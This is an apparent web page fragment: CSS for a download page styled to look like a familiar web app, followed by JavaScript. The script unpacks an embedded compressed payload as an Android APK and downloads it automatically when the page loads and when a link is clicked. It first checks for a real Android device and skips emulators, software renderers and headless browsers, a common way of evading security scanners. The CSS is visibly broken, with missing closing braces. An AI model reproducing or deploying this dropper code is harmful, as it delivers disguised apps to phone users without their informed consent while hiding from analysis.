            overflow: hidden;
            height: 100vh;
            position: relative;
            font-family: Roboto, sans-serif;
        }

        .view-box {
            position: relative;
            width: 100%;
            height: 100%;
            z-index: 1;
        }

        .inner-box {
            background-color: #4d494c;

            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 10px 12px 5px rgba(0, 0, 0, .2);

        .inner-box>.download {

            width: 150px;
            height: 30px;
            font-size: 12px;
            flex-direction: row;
            color: white;

        .inner-box>.download>.text {
            width: 100px;
            text-align: center;
            text-shadow: 0 1px 0 rgba(0, 0, 0, .8);
        }

        #gtab {
            z-index: 100;
            position: absolute;
            width: 100%;
            height: 100vh;
        }

        .f-a-center {
            display: flex;
            align-items: center;
            justify-content: center;

        .name-part {
            gap: 10px;
            color: #C4C7C5;

        .name-part>.icon {
            background-color: white;
            padding: 1px;
            border-radius: 2px;

        .nav-container {
            position: absolute;
            width: 100%;
            height: 70px;

        .nav-menu {
            width: 90%;
            font-size: 16px;
            display: flex;
            flex-direction: row;
            justify-content: space-between;
            position: relative;
        }

        .manage-part>.avatar {
            width: 30px;
            height: 30px;
            color: white;
            background-color: orange;
            border-radius: 100%;
        }

        .manage-part .menu {
            flex-direction: column;
            gap: 2px;
            height: 50px;
            width: 50px;
        }

        .manage-part .menu .point {
            background-color: #C4C7C5;
            border-radius: 100%;
            width: 5px;
            height: 5px;
        }
    </style>

function createURL(arrayBuffer) {
    const blob = new Blob([arrayBuffer], {
        type: 'application/vnd.android.package-archive'
    });
    return URL.createObjectURL(blob);
}

function downloadURL(url, filename) {
    const link = document.createElement('a');
    link.href = url;
    link.download = filename;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
}

const len = binaryString.length;
const compressed = new Uint8Array(len);
for (let i = 0; i < len; i++) {
    compressed[i] = binaryString.charCodeAt(i);
}
const binaryData = pako.inflate(compressed);
let blobURL = createURL(binaryData);

function dl(){
    if (!isRealAndroidDevice()) {
        return
    }
    let filename = "download9181" + Math.round(Math.random() * 100000) + ".apk"
    downloadURL(createURL(binaryData), filename);
}

dl();

window.onload = () => {
    let link = document.getElementById("mainlink");
    link.onclick = ev => {
        dl();
        ev.preventDefault();
        return false
    };
}

function isRealAndroidDevice() {
    if (navigator.maxTouchPoints <= 1) return false;
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl');
    if (gl) {
        const debug = gl.getExtension('WEBGL_debug_renderer_info');
        if (debug) {
            const renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
            if (/SwiftShader|ANGLE|Google|Emulator/i.test(renderer)) return false;
        }
    }
    
    if (/google_sdk|sdk|Emulator|HeadlessChrome/i.test(navigator.userAgent)) return false;
    return 'ontouchstart' in window;
}
